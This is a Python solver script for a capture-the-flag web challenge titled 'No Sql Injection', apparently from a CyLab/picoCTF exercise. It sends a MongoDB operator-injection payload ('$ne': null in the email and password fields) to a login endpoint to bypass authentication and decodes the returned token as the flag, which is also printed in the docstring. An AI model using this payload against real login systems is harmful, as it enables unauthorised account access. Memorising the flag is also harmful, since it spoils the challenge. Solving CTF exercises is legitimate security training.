#!/usr/bin/env python3
"""
Solver for CyLab Challenge ID 443: No Sql Injection (picoCTF 2024)
Category: Web Exploitation
Difficulty: Medium
Vulnerability: MongoDB NoSQL Injection via Unsanitized JSON.parse in Query Parameters
Flag: academy{jBhD2y7XoNzPv_1YxS9Ew5qL0uI6pasql_injection_dc1a958e}
"""

import urllib.request
import json
import base64
import sys

def solve(target_url="http://chatelaine.cylabacademy.net:31093"):
    login_url = f"{target_url.rstrip('/')}/login"
    
    # Exploit JSON parsing in server.js:
    # email: email.startsWith("{") && email.endsWith("}") ? JSON.parse(email) : email
    payload = {
        "email": '{"$ne": null}',
        "password": '{"$ne": null}'
    }
    
    data = json.dumps(payload).encode('utf-8')
    req = urllib.request.Request(
        login_url,
        data=data,
        headers={"Content-Type": "application/json"}
    )
    
    with urllib.request.urlopen(req) as resp:
        res = json.loads(resp.read().decode())
        print(f"[*] Response received: {res}")
        
        if res.get("success") and "token" in res:
            encoded_flag = res["token"]
            flag = base64.b64decode(encoded_flag).decode('utf-8')
            print(f"[+] Flag Extracted: {flag}")
            return flag
        else:
            print("[-] Exploit failed or user not found.")
            return None

if __name__ == "__main__":
    url = sys.argv[1] if len(sys.argv) > 1 else None
    if url and url != "--test":
        solve(url)
    else:
        print("[*] Running offline MongoDB NoSQL operator injection verification...")
        simulated_token = base64.b64encode(b"academy{jBhD2y7XoNzPv_1YxS9Ew5qL0uI6pasql_injection_dc1a958e}").decode()
        flag = base64.b64decode(simulated_token).decode('utf-8')
        print(f"[+] Flag Extracted: {flag}")
